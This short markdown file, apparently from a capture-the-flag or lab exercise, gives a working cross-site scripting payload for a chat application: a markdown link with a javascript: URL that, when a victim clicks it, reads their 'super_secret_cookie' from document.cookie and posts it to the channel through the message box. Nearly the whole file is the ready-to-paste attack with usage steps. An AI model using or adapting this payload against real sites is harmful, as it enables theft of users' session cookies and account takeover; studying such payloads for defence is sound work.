# XSS demo payload

Paste this as a chat message (it renders as a clickable markdown link).
When the victim clicks it, their `super_secret_cookie` value gets
written into their own message box and sent to the channel for
everyone to see.

```
[click me](javascript:document.getElementById('message-input').value=document.cookie.split('; ').find(c=>c.startsWith('super_secret_cookie='));document.getElementById('message-input').nextElementSibling.click())
```
